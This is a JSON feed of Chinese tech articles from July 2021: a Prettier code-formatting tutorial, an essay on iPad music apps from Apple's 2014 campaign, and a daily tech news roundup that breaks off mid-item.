[{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"回首 7 年前，看看指挥家是怎么把 iPad 从「玩具」变成「生产力」","date":"2021-07-15 03:30:22","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>如果你在互联网档案馆 <a href=\"http://web.archive.org/web/20140624185820/http://www.apple.com/cn/your-verse/orchestrating-sound/\">Wayback Machine</a> 输入 Apple 的网址，再任选一个 2014 年的日期，你有很大概率会看到带有「诗篇」字眼的链接。那是 iPad Air 还是旗舰机型的时候，Apple 的一系列营销策划。在这一系列的宣传中，Apple 用看似相当日常，故事一般的使用情境说明了 iPad Air 能为每个用户创造多么大的价值。</p>\n<p>这些故事的主角包括电影导演、失聪的旅行者、诊断脑震荡的医护人员，还有在海底工作的科研人员。每一篇「故事」的最下方的部分列举了宣传短片中人物用到的 APP。在最让我激动的一篇中，旁白角度的文字介绍了指挥家兼作曲家埃萨-佩卡·萨洛宁（Esa-Pekka Salonen，<a href=\"https://music.apple.com/us/artist/esa-pekka-salonen/5192302\">Apple Music 主页</a>）能用 iPad 做什么。</p> <p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/236c0ff177b6d4e64a4d77dedbd6c553.jpeg\"><figcaption>很遗憾，现在已经看不到华文细黑了</figcaption></figure><p>作曲家兼指挥家 Salonen 在短片中用到的三个 APP 被列举在了网页底部：The Orchestra、Pianist Pro 和 Notion<sup class=\"ss-footnote\" href=\"\" title=\"这三个 app 在 App Store 的售价分别为 68 元，30 元，98 元人民币。The Orchestra 有可选的 6 元内购，用于解锁单个声部的音频；想解锁 Notion 全部乐器的音色库则需要 198 元。\" footnote-id=\"1\">1</sup>。在这篇文章中，我希望借这三个 APP 各不相同的定位来讨论 iPad 从不伦不类的玩具向「生产力工具」过渡的那几年。</p>\n<p>这篇文章对于现实生活的意义或许是：帮助你认识到自己到底需不需要 iPad，或者决定要选购哪一款 iPad。</p>\n<h2>关于 iPad 本身</h2>\n<p>我认为 iPad 几乎完全由这三个标签定义：</p>\n<ol>\n<li>比手机<strong>大</strong>的屏幕，</li>\n<li>优于电脑的<strong>灵活性</strong>，</li>\n<li>与电脑相当的<strong>运算力</strong>。</li>\n</ol>\n<p>基础款的 10.2 英寸 iPad 就能体现这三点。纵观整个 iPad 产品线，几款 iPad 型号则在这三个指标上各有侧重：iPad mini 牺牲屏幕尺寸换取灵活性，iPad Air 平衡而不出挑，11 英寸 iPad Pro 强调运算力，12.9 英寸 iPad Pro 在强调运算力的同时牺牲灵活性以换取大屏幕。</p>\n<p>反过来，考虑 iPad 对应的软件。一款能充分体现以上三点的 APP 才算是好的 iPad APP。具体来说也就是：</p>\n<ol>\n<li>\n<strong>大屏幕</strong>：充分利用 iPad 的屏幕空间，合理地展示尽可能多的内容，</li>\n<li>\n<strong>灵活性</strong>：功能强大，能在一定程度上成为电脑软件的便携版，或者利用 iPad 的触摸屏来实现一些电脑上难以实现的工作，</li>\n<li>\n<strong>运算力</strong>：实现运算密集的工作，比如高分辨率图像渲染。</li>\n</ol>\n<p>在这样的意义下，如果以上三点都有，那这款 APP 一定是 iPad 专属的；反之，如果三点都没有，那这个 APP 就不适合在 iPad 上运行。</p>\n<p>进一步，我们来举例子。对于能否有效利用<strong>屏幕空间</strong>的例子，我最想举的就是这个 WSJ 的客户端和 nytimes 客户端的区别：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/d7b6389c65938527e7e7711f746a1282.jpg\"><figcaption>左：WSJ 客户端 右：nytimes 客户端</figcaption></figure><p>这二者都是数字化的报纸，虽然在自动生成的版面方面我更喜欢前者，但 WSJ 这个浏览新闻标题的页面实在是如同一款放大的 iPhone APP，展示的内容少之又少，同时还有大量的空白。相比之下，后者的页面利用率很高，同时也更加贴合纸质报纸的版面形态。</p>\n<p>对于充分利用 iPad <strong>灵活性</strong>的例子，我想举两个音乐 APP：KORG Module 和 Animoog。其实，它们从功能上讲有一定的区别。前者算是一个采样器（sampler），根据输入的按键输出事先录制好的声音<sup class=\"ss-footnote\" href=\"\" title=\"KORG Module 在一定程度上也允许用户对输出的声音进行加工式的调制。\" footnote-id=\"2\">2</sup>；后者则是合成器（synthesizer)，允许用户根据自己的需要调整参数来合成自己需要的音色并输出。但是如果音色已经准备就绪，那两个 APP 都可以当作现有的乐器来使用。</p>\n<p>主要的区别就在这里。KORG 的界面是一架模拟的键盘乐器，留给每个按键的空间十分逼仄，除了预设的和弦之外几乎没法用屏幕直接演奏:</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/3d935be733f833002929898119660675.jpg\"><figcaption>KORG Module 的 3D 模式和 2D 模式</figcaption></figure><p>Animoog 则用屏幕上专门为移动 APP 设计的键盘来表演音乐。这个为触屏设计的键盘本身（下方深灰色和白色的长条）就有调制功能，在现场表演有相当强的表现力。可以看到，屏幕的其他部分也被音色和波形显示器以及大量的参数旋钮充分利用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/d9a7397a761ba389e48cae47366957d7.png\"><figcaption>Animoog 的界面</figcaption></figure><p>这里我当然不是在说合成器比钢琴好，而是显然，具有表演功能合成器更适合集成为一个 iPad APP，而采样器真正的核心是音源，如果你有外接的 MIDI 键盘，那么用 iPad 还是 Mac，甚至是手机都区别不大。</p>\n<p>最后是<strong>运算力</strong>的例子。如今，以大多数 iPad 的运算力已经可以运行一些相当复杂的功能。我们当然没有理由因为一些 APP「功能过于简单」而把它当成反例，但能够实现复杂功能是我们对 iPad 的期待。当 iPad Pro 的更新一代接着一代时，不少抱怨的声音指出，iPad 被 iOS 限制了发挥。可是我们只能认为，<strong>能实现复杂功能的 iPad APP 很可能是好的 APP，但功能简洁的 APP 也不一定差</strong>。作为例子，考虑 Snapseed 和 Affinity Photo。</p>\n<p>关于运算力的反面例子也是有的。虽然 iPad 的性能已经相当足够，但是有些原本应该十分强大的软件，它们的 iPad 版本依然简陋（对，我就是在说 MS Word，或许还有那个不能在 iPad 上独立运行的 MATLAB）。</p>\n<p>以上所说的三点：大屏幕、灵活性、运算力三者的重要性，在初代 iPad Air 的时代就已经逐渐被意识到，并成为了让 iPad 向「生产力工具」过渡中需要考量的重要因素。iPad Air 在灵活性和运算力这两个方面的巨大进步，让它的产品周期成为了过渡时期中关键的一年。</p>\n<p>让我们回到「你的诗篇」中「谱写交响乐的新乐章」这个故事，看看 2014 年的人们对 iPad 的期望。</p>\n<h2>「让当代乐迷，也为古典着迷」</h2>\n<p>这个浓浓苹果味的套路翻译让人有些迷惑，它的英文原文是 Engaging a contemporary audience，用大家都懂的语言大概可以翻译成「拉一名当代听众入坑」。这部分主要宣传的交响乐团 APP 是如此的精致且内容丰富，以致于当时如果有朋友想看我的新 iPad 长什么样，我一定会用这款 APP 来演示：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/42fee975646ab2041257f8844fbb3a34.jpg\"><figcaption>The Orchestra 首页 UI</figcaption></figure><p>从这个首页菜单可以大概看出来整个 APP 大致分为两块的结构：</p>\n<ul>\n<li>八个代表各自时代的交响音乐的片段，</li>\n<li>交响乐团本身的介绍。</li>\n</ul>\n<p>在第一部分的交响乐片段中点开一首，你会看到与演奏时间严密同步的乐谱，乐团的演出视频，还有开发者 Touch Press 引以为傲的 BeatMap 乐团演奏动态示意图，同时还有文字性的乐评。</p>\n<p>第二部分则是乐团各个声部的介绍，点开一件乐器，你可以浏览介绍文字，观看由乐团成员录制的介绍短片，还能在下方的模拟键盘上按一按，亲自听到乐器的声音。下面的宣传片（部分地）展示了这个 APP 的功能：</p> <p>其中有几个值得特别关注的交互设计：</p>\n<p>拖拽下方滚动的乐谱可以让播放进度与红色指针同步:</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/9c159ed5ef3bfe69152dbc0cfab6d5ea.GIF\"></figure><p>在乐器展示的界面左右拖动可以使乐器旋转以便从各个角度观察:</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/f0f254c34ca2c8427dec1a29fbed0e86.GIF\"></figure><p>在 BeatMap 上拖拽可以聆听每个单独声部（建议点开来听）：</p> <p>这个 APP 的交互方式和常见的基于菜单、选项、文字的 APP 有很大的区别：我们的交互不再是在固定的几个按钮上的点击，而是更为自由，整个 APP 看起来更像是一款游戏。这些操作是如此符合直觉，每一处的操作都包含着一些极其直观的结果。即使从来没用过这款 app 的人都能通过尝试，迅速地了解这些操作对应的功能。</p>\n<p>但是另一方面，为了炫酷而做到的炫酷是空洞的（如果你记得多年前的 Zen Garden）。The Orchestra 的每一个交互的设计都是为了内容和知识服务的。我们很难想到比这些设计更直观，更能让人接受的形式。</p>\n<p>我认为 Touch Press 出品的几个 APP 至今仍然是「交互式内容消费」的标杆。除了 The Orchestra，这家开发者最有名的作品还包括<a href=\"https://apps.apple.com/us/app/the-elements-by-theodore-gray/id364147847\">「神奇的化学元素」</a>和 <a href=\"https://apps.apple.com/us/app/beethovens-9th-symphony/id601942399\">Beethoven’s 9th Symphony</a>，都在实践着「让用户通过简单直观的操作方式来浏览厚重的知识」这一主题。点击上方这两个 APP 的链接就可以亲自去 App Store 观看演示视频。</p>\n<p>用之前提到的三个标签来看，这款 The Orchestra 对应的主要是 iPad 的大屏幕。它非常充分地利用了这块显示屏，同时显示着大量的<strong>有用</strong>信息。这些信息的同时显示既有利于用户从多个角度同时来理解音乐作品，又不会显得像是草率堆砌而成。它也利用到了 iPad 作为平板电脑的灵活性——书籍一样的排版拉近了与读者（用户）的距离，但这并不是主要的考量。</p>\n<h2>「灵感，常常来自日常生活」</h2>\n<blockquote><p>With the iPad I am simply ready whenever it happens.</p></blockquote>\n<p>灵感常常不期而遇，所以你要时刻准备迎接它。这是这一大段宣传的中心。在宣传片中，作曲家 Salonen 在各种情境下都带着他的 iPad：汽车后座、城市街道、林间小路。这部分提到的两个 APP 成为了定义 iPad Air 的重头戏。他们分别是 Pianist Pro 和 Presonus Notion。</p>\n<p>如果你是一个 iOS 的老用户，那你很可能会觉得 Pianist Pro 非常眼熟。它的 iPhone 版本是最早出现在 App Store 的一批 APP 之一，从一开始就拥有非常精致的用户界面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/7bc64755da2fa7de25173168cacc1e69.png\"><figcaption>Pianist 和它的图标</figcaption></figure><p>iPad 版本当然拥有更大的琴键：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/3f428dd603ca820ceb04c0268521ba70.png\"><figcaption>Pianist Pro 是 Pianist 的 iPad 版本，有更多的功能</figcaption></figure><p>Pianist Pro 这款 APP 的定位其实算不得专业。它的音色实在是相当的单调，模拟的是一架按键很轻，一按就到底的钢琴（Pro 版本也有其他乐器）。强弱变化由按键的位置实现，且几乎不会伴随音色的变化。但事实上这个固定的音色相当清澈明亮，结合 APP 本身启动速度很快，打开即用的流畅性，想要随时打开按两下听一听和声效果是非常方便的<sup class=\"ss-footnote\" href=\"\" title=\"Pianist Pro 自身也可以作为外接键盘使用。通过一定的连接和设置，你可以把它作为一个键盘，接入其他的音源或者控制器。这个功能或许没有很多人在使用，但是得益于 iPad 的大屏幕，这个键盘确实是一个可行的选择。\" footnote-id=\"3\">3</sup>。</p>\n<p>还有一个被提到的 APP 是 Presonus Notion（它在 App Store 就叫 Notion，以下都称为 Notion）。这是一款用来制作乐谱，包含大量音源，可以根据输入的乐谱合成出音乐的 app。简单来说，这款 APP 更适合古典音乐作曲家使用，是一款作曲 APP。它的魅力在于，能够让没有条件实现自己音乐创作的人听到自己的乐谱被演奏出来。</p>\n<span class=\"ss-linkCard\" link-card-href=\"https://www.bilibili.com/video/BV1UB4y1N7SD\"> </span><p>「灵感」是需要记录的，所以 Notion 究竟是否适合随开随用主要取决于它的输入功能是否足够灵活好用。在 iPad Air 的时代，Apple Pencil 还远没有出现，所以如何在屏幕上录入对精密度要求很高的乐谱就是一个需要解决的问题。</p>\n<p>那时的 Notion 有三种输入音符的方式：</p>\n<ol>\n<li>在五线谱上直接放置音符（需要预先设定时值<sup class=\"ss-footnote\" href=\"\" title=\"时值即一个音符演奏时的长度。\" footnote-id=\"4\">4</sup>），</li>\n<li>利用屏幕下方的琴键输入音符（需要预先设定时值），</li>\n<li>利用录音功能在下方的琴键上直接录制，完成后自动转换为乐谱（设置时间灵敏度后无需设定时值）。</li>\n</ol>\n<p>后两种输入方式都是利用模拟键盘，几乎不会有误触。直接放置音符的第一种方法也有优化：在触摸到屏幕后，你能听到对应位置的音高并看到对应的音符，这时上下滑动可以进行调整，直到满足要求：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/22a494f55ebd4e8a0b7b120e3730065f.GIF\"><figcaption>在 Notion 中调整音高</figcaption></figure><p>后来的一次更新中，Notion 还加入了手写输入的功能，识别精度基本能和传统的纸笔记录媲美。</p>\n<p>总的来说，「灵感」这部分主要体现了 iPad「走到哪用到哪」的使用情境，也就是<strong>灵活性</strong>。Pianist 自不用说， Notion 的 iPad 版本<sup class=\"ss-footnote\" href=\"\" title=\"Presonus 公司在 2015 年七月把 Notion 带到了 iPhone 上，从此它成为了一款 universal app。\" footnote-id=\"5\">5</sup>也为触摸屏幕做了专门的设计，所以确实可以让用户在任何地方改进自己的音乐创作。笔记本电脑当然可以实现类似的功能，但是即使你愿意扛着它到处游荡，「打开即用」也是十分奢侈的。</p>\n<h2>「从概念初现，到一曲告成」</h2>\n<p>这里我们要讨论的是 iPad 运行复杂功能和专业软件的能力，毕竟我们要「一曲告成」——在 iPad 上完成一整个工程。</p>\n<p>这部分中，作曲家 Salonen 用到的 APP 还是 Pianist Pro 和 Notion。</p>\n<p>一般来说，作曲家的作品是以乐谱的形式呈现的。在绝大多数情况下，Notion 的乐器和音色库完全能够满足作曲家的需求。如此，从草稿到最终的成品，还有穿插在创作过程中的试听和修改，Notion 几乎都帮作曲家完成。</p>\n<p>在短片中，Salonen 进行的工作主要是在 MIDI 键盘、Pianist Pro 和他的钢琴上按键尝试和声效果。如果合适，那他会在作品中使用这个组合，并把它记录在乐谱中。</p>\n<p>这里不得不提一下和 Notion 定位相同的两个 APP：NotateMe 和 Symphony Pro。</p>\n<p>NotateMe 是一款让人有些迷惑的 APP。它的用户界面和产品主页怎么看都像是 21 世纪初的风格：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/3cda06573be175cfe69c6faf210d8bb0.jpg\"><figcaption>不是我网络不好，是那个嵌入的 YouTube 视频真的加载不能</figcaption></figure><p>这个 APP 整体的风格实在是有些「黑科技」的味道——如果用二十年前的视角来看。NotateMe 的输入方式是纯手写，即使在 Apple Pencil 出现之前也是这样。识别精度只能说非常有限。选取配器的操作更加迷惑：你在一行乐谱的开头输入乐器的名字，如果这个名字存在于 NotateMe（同样十分有限）的音色库中，那它能以你想要的音色正确播放，否则会输出正弦音。如果你想输入三连音<sup class=\"ss-footnote\" href=\"\" title=\"不同于一般情况下把一个音二等分，从而只能得到 1/2、1/4、1/8 等长度的做法，n 连音把一个音 n 等份，每份 1/n，从而得到更有弹性的音符时值。\" footnote-id=\"6\">6</sup>，那你只是书写超过一个小节容量的多个音符，如果被识别出无法容纳，它们会被自动编成组。这个自动操作看起来很人性化，但事实上很让人困扰，因为它让用户无法对整个乐谱有完全的控制权。</p>\n<p>Symphony Pro 具有简洁而现代化的界面，输入功能也比 NotateMe 方便很多，但它似乎也不是那个助你「一曲告成」的工具：反正我是找不到如何插入双小节线，也不知道怎么在同一份乐谱里插入多个不同的调号：<br> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/e103af520ec75988227942b2935bef48.GIF\"><figcaption>注意光标放在了第二小节，但是调号还是加在了一开始。</figcaption></figure><p>可能只有经过对比，我们才能知道我们需要的是什么。作为一款作曲 APP，Notion 能做到几乎所有你指望它能做到的：编辑乐谱，导出 PDF，导出作品音频等等。你甚至可以用调音台来简单地控制每个声部在表演时的空间位置，和它们的音量大小。在性能方面，如今在 Notion 中同时模拟 32 条音轨也不会收到性能吃紧的警告<sup class=\"ss-footnote\" href=\"\" title=\"我用的是 iPad Pro 10.5 英寸版本。曾经，在第一代 iPad Air 上运行的时候确实会时不时收到警告。\" footnote-id=\"7\">7</sup>。总的来说，这些也都够用了。</p>\n<p>我认为 Notion 算是把桌面平台的软件移植成移动 APP 的行业典范。它的 iOS 版本不止是一个乐谱阅读器或者模拟乐团的 app，而是支持桌面版几乎所有的编辑工具，且所有按钮和交互都为移动触摸屏做了适当的优化，上手非常快。它非常有效地利用了 iPad 的性能，能做一些「正经」的工作。</p>\n<h2>回到 iPad</h2>\n<p>虽然上面所说的两款和「生产力」相关的 Pianist Pro 和 Notion 都还有很大的进步空间，但<strong>如果你足够勤奋</strong>，那这些 APP 的确足够在很大程度上帮你书写一个交响「诗篇」了。</p>\n<p>考虑到这一系列的 APP 早在初代 iPad Air（A7 芯片）的年代就已经基本固定了它们的形态，那如今官方在售的 iPad 中，最老的芯片也是 A12。可以说，如果没有一代代 iOS 系统的拖累，那么它们完全能够胜任这些工作了。毕竟，对性能要求非常之高而不得不用到 M1 芯片的工作情境实在是不多。这些年来，关于新款 iPad 性能的评测甚至都在变得越来越少。</p>\n<p>还有一项值得注意的变化是 2015 年 Apple Pencil 的加入。我不再专门讨论它是因为，现在全系列的 iPad 都已经支持了 Apple Pencil。所以，对 Apple Pencil 的支持已经不再是「必须选择 iPad Pro」的原因。</p>\n<p>或许软件还是限制 iPad 生产力的因素之一，但是 iPad 是否还在限制我们的生产力？这其实是一个越来越难以正面回答的问题。如果你也会考虑为什么总会觉得手上的工具不够用，或者究竟需要用它来做什么，那么这些七年前的「诗篇」或许能让你找到答案。</p>\n<p><strong>关联阅读：</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/66364\">iPad 选购指南 · 2021 年 4 月丨SoberStudio</a></li>\n<li><a href=\"https://sspai.com/post/62981\">影视工作者除了用 iPad 看电影还能做什么？</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67720"},{"title":"派早报：荣耀发布 MagicBook 新品、微软将推出 Window 365 等","date":"2021-07-15 00:23:07","description":"\n<h2>荣耀 MagicBook 14/15 锐龙版 2021 款正式发布</h2>\n<p>7 月 14 日晚，荣耀公司通过线上发布了 MagicBook 14/15 的 2021 锐龙款，搭载 7nm 制程的锐龙 5000 系列处理器。分别配备了 14 英寸和 15.6 英寸 1080p、300 尼特亮度的屏幕，支持 DC 调光。在配置方面，拥有锐龙 5 5500U、锐龙 7 5700U 两款芯片版本，全系配备 16GB 内存；采用 65W 可分离双头 USB-C 充电器，保留指纹解锁登录设计。荣耀方面表示，两款新品均支持升级到 Windows 11。</p>\n<p>MagicBook 14 锐龙版￥4499 起售（R5 16+512），首销期间优惠价为￥4199；MagicBook 15 锐龙版￥4599 起售（R5 16+512），首销优惠价为￥4299。将于 7 月 14 日开启预售，7 月 20 日首销。<a href=\"https://www.hihonor.com/cn/shop/product/10086017606093.html\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/article/965bf4500fc8f03bc47c415fde76ac01\"></figure><h2>微软计划推出 Windows 365 服务</h2>\n<p>微软公司计划推出 Windows 365 服务，该服务主要面向企业用户，支持通过任何浏览器在云端使用 Windows 操作系统。Microsoft 365 项目总监 Wangui McKelvey 表示，Windows 365 服务将允许用户通过 Mac、iOS、Android 或 Linux 等设备使用 Windows 10 或 11，即使切换设备，云端系统的状态和数据依然保持不变。<a href=\"https://www.theverge.com/2021/7/14/22575064/microsoft-windows-365-cloud-pc-launch-date-price-features\" target=\"_blank\">来源</a></p>\n<h2>Android 12 Beta 3 上线</h2>\n<p>7 月 15 日凌晨，Android 12 第 3 个测试版本（Beta 3）上线，长截图、基于人脸识别的自动旋转、本地全局搜索等功能在该版本中正式上；作为正式版发布前的倒数第二个测试版本，Android 12 Beta 3 同时也是确定该版本最终 API 和 SDK 的测试版本，近期公布的游戏模式 Games Mode APIs、保证应用内容不被麦克风、相机使用提示遮挡的 Privacy indicator APIs 也都在这一版本中得到实装。<a href=\"https://android-developers.googleblog.com/2021/07/android-12-beta-3.html\" target=\"_blank\">来源</a></p>\n<h2>iOS 15 及 iPadOS 15 Beta 3 上线</h2>\n<p>Apple 于 7 月 14 日发布了 iOS 15 及 iPadOS 15 的 Beta 3 开发者版本更新，更新包含 SharePlay 功能及部分稳定性修复等。<a href=\"https://9to5mac.com/2021/07/14/ios-15-beta-3-developers-now-available/\" target=\"_blank\">来源</a></p>\n<h2>Firefox 90 正式发布</h2>\n<p>Firefox 浏览器的最新版 Firefox 90 于 7 月 14 日正式发布。Firefox 90 的桌面版本正式引入了增强隐私浏览的 SmartBlock 2.0，可以在进一步的阻止脚本跟踪的同时依旧可以使用相关的脚本来实现网页登录操作。Firefox 90 移除了对老旧的 FTP 支持；针对没有硬件加速的设备，现在通过软件 WebRender 也可以实现 web 应用以 60 帧显示。Windows 版的 Firefox 90 现在可以开启后台更新功能，并可以通过后台页面检查第三方应用引起的兼容性问题。 <a href=\"https://www.neowin.net/news/firefox-90-launches-with-smartblock-20-and-windows-improvements/?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed:+neowin-main+(Neowin+News)\" target=\"_blank\">来源</a></p>\n<h2>字节跳动将进军外卖市场</h2>\n<p>字节跳动公司旗下的短视频平台抖音于近期成立了外卖业务的团队，并开始在《抖音》app 内测试「心动外卖」服务。目前，「心动外卖」的产品定位更接近外卖服务整合平台，用户在「心动外卖」中可以通过短视频发布或查看外卖的真实评价，将外卖转变为动态信息。<a href=\"https://www.36kr.com/p/1311268092723721\" target=\"_blank\">来源</a></p>\n<h2>Facebook 超 50 名员工因滥用数据权限被解雇</h2>\n<p>近日，有媒体报道称，社交平台 Facebook 已经解雇了超过 50 名员工，原因是这些员工滥用用户数据访问权限，部分员工甚至通过该权限窃取了爱慕对象的隐私数据。据报道显示，这 50 多名员工的解雇发生在 2014 年到 2015 年间，涉及的用户隐私数据包括地理位置坐标、被删除的照片、私人消息等。<a href=\"https://tech.ifeng.com/c/87sC2RTYVNi\" target=\"_blank\">来源</a></p>\n<h2>央行明确网络平台不得向金融机构提供个人数据</h2>\n<p>近日，中国人民银行（央行）征信管理局向网络平台下发相关通知，要求平台机构在与金融机构开展引流、助贷、联合贷等业务合作中，不得将个人主动提交的信息、平台内产生的信息，或从外部获取的信息以申请信息、身份信息、基础信息、个人画像评分信息等名义直接向金融机构提供。今年 4 月，人民银行、银保监会等金融管理部门已经联合对 13 家主要网络平台企业进行了监管约谈，目前互联网平台大多已于 6 月末前完成了初步整改方案。<a href=\"https://www.ithome.com/0/562/412.htm\" target=\"_blank\">来源</a></p>\n<h2>日本拟新规推动复古游戏复刻</h2>\n<p>7 月 13 日，日本政府发布了《知识产权推进计划 2021》，将对部分老游戏的版权进行集中管理。根据该计划的内容所示，日本政府将设立专门管理「版权归属不明的老游戏」的统一机构，开发者只需向该机构提出申请并支付一笔固定费用，即可使用该游戏的角色、设定等并进行复刻。该计划预计将于 2022 年实施，有望推进复古游戏的大规模复刻。<a href=\"https://www.3dmgame.com/news/202107/3818876.html\" target=\"_blank\">来源</a></p>\n<h2>NBA 2K22 封面球星及发售时间公布</h2>\n<p>游戏开发商 2K 公司于 7 月 14 日公布了旗下新作 NBA 2K22 的封面球星及发售日，其中，卢卡·东契奇（Luka Dončić）将担任标准版及跨世代数字同捆版的封面球星，而卡里姆-阿卜杜-贾巴尔（Kareem 